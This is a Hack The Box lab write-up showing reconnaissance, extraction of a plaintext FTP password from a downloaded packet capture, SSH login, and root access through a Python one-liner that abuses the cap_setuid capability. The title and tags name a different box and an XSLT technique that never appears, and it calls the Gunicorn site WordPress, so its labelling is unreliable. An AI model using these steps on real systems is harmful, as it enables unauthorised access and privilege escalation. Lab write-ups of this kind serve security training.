---
title: HTB-Conversor Writeup
date: 2026-02-08T20:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
  - XSLT
---
> This demostration user the Kali IP address: 10.10.17.128

## Initial Reconnaissance

### Nmap Port Scan

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --min-rate 10000 -p- 10.129.11.242               
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 06:16 EST
Warning: 10.129.11.242 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.11.242
Host is up (0.15s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.74 seconds
```

Three TCP ports are open：21、22、80.

### Nmap Detailed Scan

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sT -sC -sV -O -p21,22,80 10.129.11.242                                 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 06:17 EST
Nmap scan report for 10.129.11.242
Host is up (0.086s latency).

PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open     http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds
```

## FTP Penetration

The target machine has the FTP service open. I attempted to log in using the `anonymous` account.

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ftp 10.129.11.242  
Connected to 10.129.11.242.
220 (vsFTPd 3.0.3)
Name (10.129.11.242:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```

Login failed. Next, I will proceed with Web penetration on port 80 to see if any information can be gathered.

## Web Penetration

Port 80 hosts a WordPress Dashboard interface using the Colorlib theme.

![](Pasted%20image%2020260208201108.png)

Entering the "Security Snapshot" interface, I discovered that I could download pacp traffic files. Additionally, the number following `data` i th URL changes with every visit.

![](Pasted%20image%2020260208201409.png)

I suspected that `/data/0` might contain valuable data, so I downloaded it to Kali for analysis.

### Traffic Analysis

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ls
0.pcap

┌──(kali㉿kali)-[~/Work/Kali]
└─$ tshark -r 0.pcap -V | grep 'ftp'                                  
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
```

I found that the packet capture contained FTP traffic, so I performed a more detailed extraction.

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ tshark -r 0.pcap -Y "ftp.request.command" -T fields -e ftp.request.command -e ftp.request.arg

USER    nathan
PASS    Buck3tH4TF0RM3!
SYST
PORT    192,168,196,1,212,140
LIST
PORT    192,168,196,1,212,141
LIST    -al
TYPE    I
PORT    192,168,196,1,212,143
RETR    notes.txt
QUIT
```

I discovered the username and password for `nathan`, so I attempted to SSH in.

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ssh nathan@10.129.11.242
nathan@10.129.11.242's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Feb  8 12:20:22 UTC 2026

  System load:           0.0
  Usage of /:            36.7% of 8.73GB
  Memory usage:          34%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.11.242
  IPv6 address for eth0: dead:beef::250:56ff:feb9:883c

  => There are 4 zombie processes.


63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Feb  8 11:38:54 2026 from 10.10.17.128
nathan@cap:~$ whoami
nathan
```

## Linux Privilege Escalation

Enumerated sudo permissions and SUID binaries but did not find any immediate paths for privilege escalation.

```bash
nathan@cap:~$ sudo -l
[sudo] password for nathan: 
Sorry, try again.
[sudo] password for nathan: 
Sorry, user nathan may not run sudo on cap.
nathan@cap:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/snap/snapd/11841/usr/lib/snapd/snap-confine
/snap/snapd/12398/usr/lib/snapd/snap-confine
/snap/core18/2066/bin/mount
/snap/core18/2066/bin/ping
/snap/core18/2066/bin/su
/snap/core18/2066/bin/umount
/snap/core18/2066/usr/bin/chfn
/snap/core18/2066/usr/bin/chsh
/snap/core18/2066/usr/bin/gpasswd
/snap/core18/2066/usr/bin/newgrp
/snap/core18/2066/usr/bin/passwd
/snap/core18/2066/usr/bin/sudo
/snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2066/usr/lib/openssh/ssh-keysign
/snap/core18/2074/bin/mount
/snap/core18/2074/bin/ping
/snap/core18/2074/bin/su
/snap/core18/2074/bin/umount
/snap/core18/2074/usr/bin/chfn
/snap/core18/2074/usr/bin/chsh
/snap/core18/2074/usr/bin/gpasswd
/snap/core18/2074/usr/bin/newgrp
/snap/core18/2074/usr/bin/passwd
/snap/core18/2074/usr/bin/sudo
/snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2074/usr/lib/openssh/ssh-keysign

```

Further enumeration revealed that `python3.8` has capabilities setuid.

```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Used Python to achive privilege escalation.

```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# whoami
root
```
